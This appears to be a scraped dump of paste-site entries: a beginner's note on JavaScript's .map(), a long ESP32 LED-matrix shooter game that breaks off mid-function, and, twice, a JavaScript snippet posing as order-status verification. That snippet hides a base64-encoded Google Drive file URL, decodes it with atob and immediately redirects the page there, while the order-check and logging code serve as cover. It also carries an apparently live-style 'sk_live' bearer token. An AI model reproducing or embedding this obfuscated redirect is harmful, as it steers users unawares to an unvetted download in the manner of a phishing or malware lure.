          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fNc24nYr,004 map method,xerocool-101,JavaScript,Sunday 20th of April 2025 10:10:20 AM CDT,"// The .map() method creates a new array by applying a function to each element of the original array.
// It's like saying: “take each item, do something to it, and return a new array with the results.”

// Return new array
const numbers = [1, 2, 3, 4];
const doubled = numbers.map((num, index, array) => num * 2);
console.log(doubled); // [2, 4, 6, 8]

// Object
const users = [
  { id: 1, name: ""Alice"" },
  { id: 2, name: ""Bob"" }
];

const names = users.map(user => user.name);
console.log(names); // [""Alice"", ""Bob""]

// React
setUsers(users.map((u) => (u._id === editId ? res.data : u)));

{todos.map(todo => (
  <li key={todo.id}>{todo.text}</li>
))}

//
"
fjaPMyBN,Untitled,jm33,JavaScript,Sunday 20th of April 2025 10:03:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32005/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ni08fH0H,atomtendo,shivamisone,C++,Sunday 20th of April 2025 10:03:03 AM CDT,"#include <FastLED.h>
#include <pitches.h>
#define Score_Address 0
int starPositions[10][2];  // Track up to 10 stars
int numStars = 3;
const int NUM_STAR_COLORS = 2;

#define scorePin 15
#define LED_PIN 2
#define NUM_LEDS 200
#define ROWS 10
#define COLS 20
#define sright 12
#define shoots 14
#define sleft 13
#define max_bullets 12  // Maximum number of bullets on screen at once
#define max_enemies 12
bool gameStarted = false;
const int motorPin = 4;


const int binPin[10] = { 19, 20, 59, 60, 99, 100, 139, 140, 179, 180 };
int ssleft = 0;
int ssright = 2;
const int melody[] = {
  // The Godfather theme
  REST, 4, REST, 8, REST, 8, REST, 8, NOTE_E4, 8, NOTE_A4, 8, NOTE_C5, 8,  //1
  NOTE_B4, 8, NOTE_A4, 8, NOTE_C5, 8, NOTE_A4, 8, NOTE_B4, 8, NOTE_A4, 8, NOTE_F4, 8, NOTE_G4, 8,
  NOTE_E4, 2, NOTE_E4, 8, NOTE_A4, 8, NOTE_C5, 8,
  NOTE_B4, 8, NOTE_A4, 8, NOTE_C5, 8, NOTE_A4, 8, NOTE_C5, 8, NOTE_A4, 8, NOTE_E4, 8, NOTE_DS4, 8,

  NOTE_D4, 2, NOTE_D4, 8, NOTE_F4, 8, NOTE_GS4, 8,  //5
  NOTE_B4, 2, NOTE_D4, 8, NOTE_F4, 8, NOTE_GS4, 8,
  NOTE_A4, 2, NOTE_C4, 8, NOTE_C4, 8, NOTE_G4, 8,
  NOTE_F4, 8, NOTE_E4, 8, NOTE_G4, 8, NOTE_F4, 8, NOTE_F4, 8, NOTE_E4, 8, NOTE_E4, 8, NOTE_GS4, 8,

  NOTE_A4, 2, REST, 8, NOTE_A4, 8, NOTE_A4, 8, NOTE_GS4, 8,  //9
  NOTE_G4, 2, NOTE_B4, 8, NOTE_A4, 8, NOTE_F4, 8,
  NOTE_E4, 2, NOTE_E4, 8, NOTE_G4, 8, NOTE_E4, 8,
  NOTE_D4, 2, NOTE_D4, 8, NOTE_D4, 8, NOTE_F4, 8, NOTE_DS4, 8,

  NOTE_E4, 2, REST, 8, NOTE_E4, 8, NOTE_A4, 8, NOTE_C5, 8,  //13

  //repeats from 2
  NOTE_B4, 8, NOTE_A4, 8, NOTE_C5, 8, NOTE_A4, 8, NOTE_B4, 8, NOTE_A4, 8, NOTE_F4, 8, NOTE_G4, 8,  //2
  NOTE_E4, 2, NOTE_E4, 8, NOTE_A4, 8, NOTE_C5, 8,
  NOTE_B4, 8, NOTE_A4, 8, NOTE_C5, 8, NOTE_A4, 8, NOTE_C5, 8, NOTE_A4, 8, NOTE_E4, 8, NOTE_DS4, 8,

  NOTE_D4, 2, NOTE_D4, 8, NOTE_F4, 8, NOTE_GS4, 8,  //5
  NOTE_B4, 2, NOTE_D4, 8, NOTE_F4, 8, NOTE_GS4, 8,
  NOTE_A4, 2, NOTE_C4, 8, NOTE_C4, 8, NOTE_G4, 8,
  NOTE_F4, 8, NOTE_E4, 8, NOTE_G4, 8, NOTE_F4, 8, NOTE_F4, 8, NOTE_E4, 8, NOTE_E4, 8, NOTE_GS4, 8,

  NOTE_A4, 2, REST, 8, NOTE_A4, 8, NOTE_A4, 8, NOTE_GS4, 8,  //9
  NOTE_G4, 2, NOTE_B4, 8, NOTE_A4, 8, NOTE_F4, 8,
  NOTE_E4, 2, NOTE_E4, 8, NOTE_G4, 8, NOTE_E4, 8,
  NOTE_D4, 2, NOTE_D4, 8, NOTE_D4, 8, NOTE_F4, 8, NOTE_DS4, 8,

  NOTE_E4, 2  //13
};
const int buzzerPin = 26;
const int screen[ROWS][COLS] = {
  { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 },
  { 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 },
  { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40 },
  { 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79 },
  { 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80 },
  { 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119 },
  { 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120 },
  { 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159 },
  { 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160 },
  { 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199 }
};
CRGB colors[ROWS][COLS];
CRGB leds[NUM_LEDS];

// Structure to track bullets
struct Bullet {
  int row;
  int col;
  bool active;
  unsigned long lastMoveTime;
};
struct Enemy {
  int type;
  int health;
  int row;
  int col;
  bool active;
  unsigned long lastMoveTime;
};
// array to store enemies
Enemy enemies[max_enemies];
// Array to store bullets
Bullet bullets[max_bullets];
//Timing variables Enemy
int difficultyFactor = 3;
int difficultyFactor1 = 18;
unsigned long EnemyMoveInterval = 600;  // Time between enemy movements in ms
unsigned long lastEnemySpawnTime = 0;
unsigned long enemyCooldown = 2500;  // Minimum time between spawning enemies

// Timing variables Bullet
const unsigned long bulletMoveInterval = 100;  // Time between bullet movements in ms
unsigned long lastBulletFiredTime = 0;         // Time when last bullet was fired
const unsigned long bulletCooldown = 10;       // Minimum time between firing bullets
int score = 0;
int maxhealth = 3;
void setLEDColors(CRGB colors[ROWS][COLS]) {
  for (int i = 0; i < ROWS; i++) {
    for (int j = 0; j < COLS; j++) {
      int led = pgm_read_word(&(screen[i][j]));
      leds[led] = colors[i][j];
    }
  }
}

// Button debouncing variables
unsigned long lastDebounceTimeLeft = 0;
unsigned long lastDebounceTimeRight = 0;
unsigned long lastDebounceTimeShoot = 0;
unsigned long debounceDelay = 50;
bool leftButtonActive = false;
bool rightButtonActive = false;

int lastLeftState = HIGH;
int lastRightState = HIGH;
int lastShootState = HIGH;
bool shootButtonPressed = false;  // Track if shoot button is being held down

void setup() {
  pinMode(scorePin, INPUT_PULLUP);
initStarfield();

  pinMode(motorPin, OUTPUT);
  FastLED.addLeds<WS2812, LED_PIN, GRB>(leds, NUM_LEDS);
  FastLED.clear();
  setupMusic();  // Initialize the music player
  startMusic();  // Start playing the music
  FastLED.show();
  pinMode(shoots, INPUT_PULLUP);
  pinMode(sleft, INPUT_PULLUP);
  pinMode(sright, INPUT_PULLUP);
  Serial.begin(9600);
  int x = random(1, 2343);
  int total = 0;
  for (int i = 15; i <= 23; i++)  // or up to A7 for many Arduino boards.
    total += (analogRead(i) + x);
  randomSeed(total);

  // Initialize all bullets as inactive
  for (int i = 0; i < max_bullets; i++) {
    bullets[i].active = false;
    enemies[i].active = false;
  }
  while (!gameStarted) {
    mainscreen();
    checkStartButton();
  }
}

void displayBinary(int num) {
  for (int i = 0; i < 10; i++) {
    if ((num >> i) & 1) {
      colors[i][19] = CRGB(255, 255, 255);
    }
  }
}

void mainscreen() {  //chamakta hua A.T.O.M
  static unsigned long lastChange = 0;
  if (millis() - lastChange > 700) {
    for (int i = 0; i < 10; i++) {
      int c1 = random(255);
      int c2 = random(255);
      int c3 = random(255);
      colors[2][0] = CRGB(c1, c2, c3);
      colors[3][0] = CRGB(c1, c2, c3);
      colors[4][0] = CRGB(c1, c2, c3);
      colors[5][0] = CRGB(c1, c2, c3);
      colors[6][0] = CRGB(c1, c2, c3);

      colors[2][2] = CRGB(c1, c2, c3);
      colors[3][2] = CRGB(c1, c2, c3);
      colors[4][2] = CRGB(c1, c2, c3);
      colors[5][2] = CRGB(c1, c2, c3);
      colors[6][2] = CRGB(c1, c2, c3);

      colors[2][6] = CRGB(c1, c2, c3);
      colors[3][6] = CRGB(c1, c2, c3);
      colors[4][6] = CRGB(c1, c2, c3);
      colors[5][6] = CRGB(c1, c2, c3);
      colors[6][6] = CRGB(c1, c2, c3);

      colors[2][10] = CRGB(c1, c2, c3);
      colors[3][10] = CRGB(c1, c2, c3);
      colors[4][10] = CRGB(c1, c2, c3);
      colors[5][10] = CRGB(c1, c2, c3);
      colors[6][10] = CRGB(c1, c2, c3);

      colors[2][13] = CRGB(c1, c2, c3);
      colors[3][13] = CRGB(c1, c2, c3);
      colors[4][13] = CRGB(c1, c2, c3);
      colors[5][13] = CRGB(c1, c2, c3);
      colors[6][13] = CRGB(c1, c2, c3);

      colors[2][15] = CRGB(c1, c2, c3);
      colors[3][15] = CRGB(c1, c2, c3);
      colors[4][15] = CRGB(c1, c2, c3);
      colors[5][15] = CRGB(c1, c2, c3);
      colors[6][15] = CRGB(c1, c2, c3);

      colors[2][19] = CRGB(c1, c2, c3);
      colors[3][19] = CRGB(c1, c2, c3);
      colors[4][19] = CRGB(c1, c2, c3);
      colors[5][19] = CRGB(c1, c2, c3);
      colors[6][19] = CRGB(c1, c2, c3);

      colors[2][1] = CRGB(c1, c2, c3);
      colors[4][1] = CRGB(c1, c2, c3);
      colors[2][4] = CRGB(c1, c2, c3);
      colors[2][5] = CRGB(c1, c2, c3);
      colors[2][7] = CRGB(c1, c2, c3);
      colors[2][8] = CRGB(c1, c2, c3);
      colors[2][11] = CRGB(c1, c2, c3);
      colors[2][12] = CRGB(c1, c2, c3);
      colors[6][11] = CRGB(c1, c2, c3);
      colors[6][12] = CRGB(c1, c2, c3);
      colors[4][16] = CRGB(c1, c2, c3);
      colors[4][17] = CRGB(c1, c2, c3);
      colors[4][18] = CRGB(c1, c2, c3);
      colors[3][16] = CRGB(c1, c2, c3);
      colors[3][18] = CRGB(c1, c2, c3);
      colors[5][17] = CRGB(c1, c2, c3);
      setLEDColors(colors);
      FastLED.show();
      lastChange = millis();
      updateMusic();
    }
    FastLED.show();
  }
}
//MOOOSIC
int tempo = 80;
int currentNote = 0;
int notesCount;
unsigned long previousNoteTime = 0;
int noteDuration = 0;
int pauseBetweenNotes = 0;
bool isPlaying = false;
bool isTonePlaying = false;

// Calculate the number of notes in the melody
const int noteCount = sizeof(melody) / sizeof(melody[0]) / 2;

// Configure whole note duration in milliseconds
const int wholenote = (60000 * 4) / tempo;

// Initialize the music player
void setupMusic() {
  notesCount = noteCount;
  isPlaying = true;
}

// Start or restart the music
void startMusic() {
  currentNote = 0;
  isPlaying = true;
  isTonePlaying = false;
  previousNoteTime = millis();
}

// Pause the music
void pauseMusic() {
  isPlaying = false;
  noTone(buzzerPin);
}

// Resume the music from where it left off
void resumeMusic() {
  isPlaying = true;
}

// Stop the music and reset to beginning
void stopMusic() {
  isPlaying = false;
  currentNote = 0;
  noTone(buzzerPin);
}

// Update music player - call this in your loop() function
void updateMusic() {
  if (!isPlaying) {
    return;
  }

  unsigned long currentTime = millis();

  // If we're playing a tone and it's time to stop it
  if (isTonePlaying && currentTime - previousNoteTime >= noteDuration) {
    noTone(buzzerPin);
    isTonePlaying = false;
    pauseBetweenNotes = noteDuration * 0.1;  // 10% pause between notes
    previousNoteTime = currentTime;
    return;
  }

  // If we're in the pause between notes
  if (!isTonePlaying && currentTime - previousNoteTime >= pauseBetweenNotes) {
    // Move to the next note
    if (currentNote >= notesCount * 2) {
      // Reached the end of the melody, restart
      currentNote = 0;
    }

    // Calculate note duration
    int divider = melody[currentNote + 1];
    if (divider > 0) {
      // Regular note
      noteDuration = wholenote / divider;
    } else if (divider < 0) {
      // Dotted note
      noteDuration = (wholenote / abs(divider)) * 1.5;
    }

    // Play the note (only if it's not a REST)
    if (melody[currentNote] != REST) {
      tone(buzzerPin, melody[currentNote], noteDuration * 0.9);
      isTonePlaying = true;
    } else {
      // For REST notes, just wait the duration
      isTonePlaying = true;
    }

    previousNoteTime = currentTime;
    currentNote += 2;  // Move to the next note-duration pair
  }
}

void drawspaceship() {
  CRGB colo;
  switch (maxhealth) {
    case 2:
      colo = CRGB(255, 248, 23);
      break;
    case 3:
      colo = CRGB(36,82,40);
      break;
    case 1:
      colo = CRGB(255, 0, 0);
      break;
    default:
      shipPhatna();
      delay(3000);
      for (int row = 0; row < ROWS; row++) {
        for (int col = 0; col < COLS; col++) {
          colors[row][col] = CRGB::Black;
        }
      }
      setLEDColors(colors);
      FastLED.show();
      gameover();
      break;
  }
  for (int i = ssleft; i <= ssright; i++) {
    colors[i][0] = colo;
  }
  colors[ssleft + 1][1] = colo;
}
void shipPhatna() {
  for (int i = ssleft; i <= ssright; i++) {
    colors[i][0] = CRGB(255, 0, 0);
  }
  colors[ssleft + 1][1] = CRGB(255, 0, 0);
  colors[ssleft - 1][1] = CRGB(255, 64, 0);
  colors[ssleft - 2][2] = CRGB(255, 128, 0);
  colors[ssleft][1] = CRGB(255, 64, 0);
  colors[ssleft][2] = CRGB(255, 128, 0);
  colors[ssleft - 1][3] = CRGB(255, 64, 0);
  colors[ssleft - 2][4] = CRGB(255, 128, 0);
  colors[ssleft + 1][2] = CRGB(255, 64, 0);
  colors[ssleft + 1][3] = CRGB(255, 64, 0);
  colors[ssleft + 2][2] = CRGB(255, 128, 0);
  colors[ssleft + 2][1] = CRGB(255, 64, 0);
  colors[ssleft + 3][1] = CRGB(255, 128, 0);
  colors[ssleft + 3][2] = CRGB(255, 128, 0);
  setLEDColors(colors);
  FastLED.show();
}
void spawnEnemies() {
  unsigned long currentTime = millis();
  if (currentTime - lastEnemySpawnTime < enemyCooldown) {
    return;
  }

  int spawnCount = (random(1, 100) < 35) ? 2 : 1;
  for (int i = 0; i < max_enemies && spawnCount > 0; i++) {
    if (!enemies[i].active) {
      int rs = random(1, 100);
      if (rs > 4 && rs < 32) {
        enemies[i].type = 2;
        enemies[i].health = 2;
      } else if (rs <= 4) {
        enemies[i].type = 3;
        enemies[i].health = 10;
        spawnCount = 1;
      } else {
        enemies[i].type = 1;
        enemies[i].health = 1;
      }
      if (enemies[i].type == 3) {
        enemies[i].row = 3;
        enemies[i].col = 18;
      } else {
        enemies[i].row = random(1, 8);
        enemies[i].col = 18;
      }
      enemies[i].active = true;
      enemies[i].lastMoveTime = currentTime;
      lastEnemySpawnTime = currentTime;
      spawnCount--;
    }
  }
}


void fireBullet() {
  unsigned long currentTime = millis();

  // Add cooldown to prevent firing too rapidly
  if (currentTime - lastBulletFiredTime < bulletCooldown) {
    return;
  }

  // Find first inactive bullet
  for (int i = 0; i < max_bullets; i++) {
    if (!bullets[i].active) {
      bullets[i].row = ssleft + 1;  // Middle of ship
      bullets[i].col = 2;           // Just in front of ship
      bullets[i].active = true;
      bullets[i].lastMoveTime = currentTime;
      lastBulletFiredTime = currentTime;

      return;
    }
  }
}
void updateEnemies() {
  unsigned long currentTime = millis();
  int moveBoss = EnemyMoveInterval;
  for (int i = 0; i < max_enemies; i++) {
    if (enemies[i].active) {
      if (enemies[i].type == 1)
        colors[enemies[i].row][enemies[i].col] = CRGB(0, 255, 0);
      else if (enemies[i].type == 2) colors[enemies[i].row][enemies[i].col] = CRGB(255, 45, 241);
      else if (enemies[i].type == 3) {
        colors[enemies[i].row][enemies[i].col] = CRGB(150, 150, random(0, 255));
        colors[enemies[i].row + 1][enemies[i].col] = CRGB(150, 150, random(0, 255));
        colors[enemies[i].row + 2][enemies[i].col] = CRGB(150, 150, random(0, 255));
        colors[enemies[i].row + 1][enemies[i].col - 1] = CRGB(150, 150, random(0, 255));
        colors[enemies[i].row][enemies[i].col - 2] = CRGB(150, 150, random(0, 255));
        colors[enemies[i].row + 1][enemies[i].col - 2] = CRGB(150, 150, random(0, 255));
        colors[enemies[i].row + 2][enemies[i].col - 2] = CRGB(150, 150, random(0, 255));
      }
    }

    if (enemies[i].type == 3) {
      EnemyMoveInterval = 2000;
    }
    if (currentTime - enemies[i].lastMoveTime > EnemyMoveInterval) {
      enemies[i].col--;
      if (enemies[i].type != 3) {
        if (random(1, 100) < 25 && enemies[i].row > 2) {
          int new_row = enemies[i].row + random(-1, 2);
          if (new_row != 0 && new_row != ROWS - 1) {
            enemies[i].row = new_row;
          }
        }
        if (random(1, 100) < 20 && enemies[i].row > 2) {
          int new_row = enemies[i].row + random(-1, 2);
          if (new_row != 0 && new_row != ROWS - 1) {
            enemies[i].row = new_row;
          }
        }
      }

      enemies[i].lastMoveTime = currentTime;

      int er = enemies[i].row;
      int ec = enemies[i].col;

      bool shipCollision = false;
      if (enemies[i].type == 3) {
        if ((ssleft == er && 0 == enemies[i].col - 2) || (ssleft == er + 1 && 0 == enemies[i].col - 2) || (ssleft == er + 2 && 0 == enemies[i].col - 2))
          shipCollision = true;
      } else {
        if (ec == 0) {
          if (er == ssleft && enemies[i].active == true) {
            shipCollision = true;
          } else if (er == ssright && enemies[i].active == true) {
            shipCollision = true;
          }
        } else if (ec == 1 && er == ssleft + 1 && enemies[i].active == true) {
          shipCollision = true;
        }
      }

      if (shipCollision) {
        maxhealth--;
        enemies[i].active = false;
      }

      for (int j = 0; j < max_bullets; j++) {
        if (enemies[i].type == 3) {
          int br = bullets[j].row;
          int bc = bullets[j].col;
          if (bullets[j].active) {
            if ((br == er && bc == enemies[i].col - 2) || (br == er + 1 && bc == enemies[i].col - 2) || (br == er + 2 && bc == enemies[i].col - 2)) {
              enemies[i].health--;
              bullets[j].active = false;
              if (enemies[i].health == 0) {
                enemies[i].active = false;
                score++;
              }
              break;
            }
          }
        }

        else if (bullets[j].active && checkCollision(j, i)) {
          enemies[i].type--;
          enemies[i].health--;
          bullets[j].active = false;
          if (enemies[i].health == 0) {
            enemies[i].active = false;
            score++;
          }
          break;
        }
      }
    }
    if (enemies[i].type == 3 && enemies[i].col < 0 && enemies[i].active == true) {
      gameover();
    }
    if (enemies[i].col < 0 && enemies[i].active == true) {
      enemies[i].active = false;
      if (score > 0) score--;
    }
  }
  EnemyMoveInterval = moveBoss;
}

void updateBullets() {
  unsigned long currentTime = millis();

  for (int i = 0; i < max_bullets; i++) {
    if (bullets[i].active) {
      // Draw the bullet
      colors[bullets[i].row][bullets[i].col] = CRGB(255, 0, 0);

      // Check if it's time to move the bullet
      if (currentTime - bullets[i].lastMoveTime > bulletMoveInterval) {
        // Move bullet forward
        bullets[i].col++;
        bullets[i].lastMoveTime = currentTime;

        for (int j = 0; j < max_enemies; j++) {

          if (enemies[j].active && enemies[j].type == 3) {
            // Check all 7 parts of type 3 enemy
            if ((bullets[i].row == enemies[j].row && bullets[i].col == enemies[j].col) || (bullets[i].row == enemies[j].row + 1 && bullets[i].col == enemies[j].col) || (bullets[i].row == enemies[j].row + 2 && bullets[i].col == enemies[j].col) || (bullets[i].row == enemies[j].row + 1 && bullets[i].col == enemies[j].col - 1) || (bullets[i].row == enemies[j].row && bullets[i].col == enemies[j].col - 2) || (bullets[i].row == enemies[j].row + 1 && bullets[i].col == enemies[j].col - 2) || (bullets[i].row == enemies[j].row + 2 && bullets[i].col == enemies[j].col - 2)) {
              enemies[j].health--;
              bullets[i].active = false;
              if (enemies[j].health <= 0) {
                enemies[j].active = false;
                score++;
              }
              break;
            }
          } else if (enemies[j].active && checkCollision(i, j)) {
            if (enemies[j].type == 2) enemies[j].type--;
            enemies[j].health--;
            bullets[i].active = false;
            if (enemies[j].health == 0) {
              enemies[j].active = false;
              score++;
            }
            break;
          }
        }
        // Check if bullet reached the end of the screen
        if (bullets[i].col >= COLS) {
          bullets[i].active = false;
        }
      }
    }
  }
}

void checkStartButton() {
  int buttonState = digitalRead(shoots);
  if (buttonState == LOW) {
    delay(50);  // Simple debounce
    if (digitalRead(shoots) == LOW) {
      gameStarted = true;
      FastLED.clear();
      FastLED.show();
    }
  }
}

bool checkCollision(int i, int j) {
  if (!bullets[i].active || !enemies[j].active) {
    return false;
  }
  int er = enemies[j].row;
  int ec = enemies[j].col;
  int br = bullets[i].row;
  int bc = bullets[i].col;

  return (er == br && ec == bc);
}


void gameover() {
  digitalWrite(motorPin, HIGH);  // Turn motor ON


  colors[2][6] = CRGB(255, 0, 0);
  colors[3][6] = CRGB(255, 0, 0);
  colors[2][7] = CRGB(255, 0, 0);
  colors[3][7] = CRGB(255, 0, 0);
  colors[2][12] = CRGB(255, 0, 0);
  colors[3][12] = CRGB(255, 0, 0);
  colors[3][13] = CRGB(255, 0, 0);
  colors[2][13] = CRGB(255, 0, 0);

  //white face
  colors[0][4] = CRGB(255, 255, 255);
  colors[1][4] = CRGB(255, 255, 255);
  colors[2][4] = CRGB(255, 255, 255);
  colors[3][4] = CRGB(255, 255, 255);
  colors[4][4] = CRGB(255, 255, 255);
  colors[5][4] = CRGB(255, 255, 255);
  colors[6][4] = CRGB(255, 255, 255);
  colors[0][5] = CRGB(255, 255, 255);
  colors[0][6] = CRGB(255, 255, 255);
  colors[0][7] = CRGB(255, 255, 255);
  colors[0][8] = CRGB(255, 255, 255);
  colors[0][9] = CRGB(255, 255, 255);
  colors[0][10] = CRGB(255, 255, 255);
  colors[0][11] = CRGB(255, 255, 255);
  colors[0][12] = CRGB(255, 255, 255);
  colors[0][13] = CRGB(255, 255, 255);
  colors[0][14] = CRGB(255, 255, 255);
  colors[0][15] = CRGB(255, 255, 255);
  colors[1][5] = CRGB(255, 255, 255);
  colors[1][6] = CRGB(255, 255, 255);
  colors[1][7] = CRGB(255, 255, 255);
  colors[1][8] = CRGB(255, 255, 255);
  colors[1][9] = CRGB(255, 255, 255);
  colors[1][10] = CRGB(255, 255, 255);
  colors[1][11] = CRGB(255, 255, 255);
  colors[1][12] = CRGB(255, 255, 255);
  colors[1][13] = CRGB(255, 255, 255);
  colors[1][14] = CRGB(255, 255, 255);
  colors[1][15] = CRGB(255, 255, 255);
  colors[2][5] = CRGB(255, 255, 255);
  colors[3][5] = CRGB(255, 255, 255);
  colors[2][8] = CRGB(255, 255, 255);
  colors[2][9] = CRGB(255, 255, 255);
  colors[2][10] = CRGB(255, 255, 255);
  colors[2][11] = CRGB(255, 255, 255);
  colors[3][9] = CRGB(255, 255, 255);
  colors[3][10] = CRGB(255, 255, 255);
  colors[3][11] = CRGB(255, 255, 255);
  colors[3][8] = CRGB(255, 255, 255);
  colors[3][14] = CRGB(255, 255, 255);
  colors[3][15] = CRGB(255, 255, 255);
  colors[2][14] = CRGB(255, 255, 255);
  colors[2][15] = CRGB(255, 255, 255);
  colors[4][5] = CRGB(255, 255, 255);
  colors[4][6] = CRGB(255, 255, 255);
  colors[4][7] = CRGB(255, 255, 255);
  colors[4][8] = CRGB(255, 255, 255);
  colors[4][11] = CRGB(255, 255, 255);
  colors[4][12] = CRGB(255, 255, 255);
  colors[4][13] = CRGB(255, 255, 255);
  colors[4][14] = CRGB(255, 255, 255);
  colors[4][15] = CRGB(255, 255, 255);
  colors[5][5] = CRGB(255, 255, 255);
  colors[5][6] = CRGB(255, 255, 255);
  colors[5][6] = CRGB(255, 255, 255);
  colors[5][8] = CRGB(255, 255, 255);
  colors[5][9] = CRGB(255, 255, 255);
  colors[5][10] = CRGB(255, 255, 255);
  colors[5][11] = CRGB(255, 255, 255);
  colors[5][12] = CRGB(255, 255, 255);
  colors[5][13] = CRGB(255, 255, 255);
  colors[5][14] = CRGB(255, 255, 255);
  colors[5][15] = CRGB(255, 255, 255);
  colors[6][5] = CRGB(255, 255, 255);
  colors[6][6] = CRGB(255, 255, 255);
  colors[6][7] = CRGB(255, 255, 255);
  colors[6][12] = CRGB(255, 255, 255);
  colors[6][13] = CRGB(255, 255, 255);
  colors[6][14] = CRGB(255, 255, 255);
  colors[6][15] = CRGB(255, 255, 255);
  colors[7][7] = CRGB(255, 255, 255);
  colors[7][12] = CRGB(255, 255, 255);
  colors[8][10] = CRGB(255, 255, 255);
  colors[8][11] = CRGB(255, 255, 255);
  colors[8][7] = CRGB(255, 255, 255);
  colors[8][8] = CRGB(255, 255, 255);
  colors[8][9] = CRGB(255, 255, 255);
  colors[8][12] = CRGB(255, 255, 255);
  colors[9][7] = CRGB(255, 255, 255);
  colors[9][8] = CRGB(255, 255, 255);
  colors[9][9] = CRGB(255, 255, 255);
  colors[9][10] = CRGB(255, 255, 255);
  colors[9][11] = CRGB(255, 255, 255);
  colors[9][12] = CRGB(255, 255, 255);
  colors[5][7] = CRGB(255, 255, 255);


  //nose
  colors[4][9] = CRGB(4, 69, 217);
  colors[4][10] = CRGB(4, 69, 217);

  //teeth
  colors[6][8] = CRGB(25, 118, 3);
  colors[6][9] = CRGB(217, 181, 5);
  colors[6][10] = CRGB(25, 118, 3);
  colors[6][11] = CRGB(25, 118, 3);
  colors[7][8] = CRGB(25, 118, 3);
  colors[7][9] = CRGB(25, 118, 3);
  colors[7][10] = CRGB(25, 118, 3);
  colors[7][11] = CRGB(25, 118, 3);
  setLEDColors(colors);
  FastLED.show();
  delay(9500);
  esp_restart();
}
CRGB ar[] = {
  CRGB(255, 255, 255),   
  CRGB(220, 160, 109),   
  CRGB(215, 108, 130)   
};

// Corrected color assignments
CRGB backgroundDarkBlue = CRGB(0, 0, 4);  // Deep dark blue
CRGB starColors[] = {ar[1], ar[2]};  // Use only the two defined colors after white
void updateStarfieldNonBlocking() {
  static unsigned long lastStarUpdateTime = 0;
  unsigned long currentTime = millis();

  if (currentTime - lastStarUpdateTime >= 100) {
    // Move stars
    for (int i = 0; i < numStars; i++) {
      starPositions[i][0]++;
      
      // Wrap around if star goes off the matrix
      if (starPositions[i][0] >= ROWS) {
        starPositions[i][0] = 0;
        starPositions[i][1] = random(COLS);
      }
    }

    // Redraw starfield
    for (int row = 0; row < ROWS; row++) {
      for (int col = 0; col < COLS; col++) {
        colors[row][col] = backgroundDarkBlue;
      }
    }

    // Draw stars
    for (int i = 0; i < numStars; i++) {
      CRGB starColor = starColors[i % NUM_STAR_COLORS];
      colors[starPositions[i][0]][starPositions[i][1]] = starColor;
    }

    lastStarUpdateTime = currentTime;
  }
}


void initStarfield() {
  // Initialize random star positions
  for (int i = 0; i < numStars; i++) {
    starPositions[i][0] = random(ROWS);
    starPositions[i][1] = random(COLS);
  }
}

int reduceTime = 10;
void loop() {


  // Clear the display
  Serial.println(score);

  updateStarfieldNonBlocking();

  // Read the current button states
  int currentstate_left = digitalRead(sleft);
  int currentstate_right = digitalRead(sright);
  int currentstate_shoot = digitalRead(shoots);
  int currentstate_score = digitalRead(score);

  // Left button with debouncing
  if (currentstate_left != lastLeftState) {
    lastDebounceTimeLeft = millis();
  }

  if ((millis() - lastDebounceTimeLeft) > debounceDelay) {
    if (currentstate_left == LOW && !leftButtonActive && ssleft > 0) {
      // Button is newly pressed
      ssright--;
      ssleft--;
      leftButtonActive = true;
    } else if (currentstate_left == HIGH) {
      // Button is released
      leftButtonActive = false;
    }
  }
  lastLeftState = currentstate_left;

  // Right button with debouncing
  if (currentstate_right != lastRightState) {
    lastDebounceTimeRight = millis();
  }

  if ((millis() - lastDebounceTimeRight) > debounceDelay) {
    if (currentstate_right == LOW && !rightButtonActive && ssright < 9) {
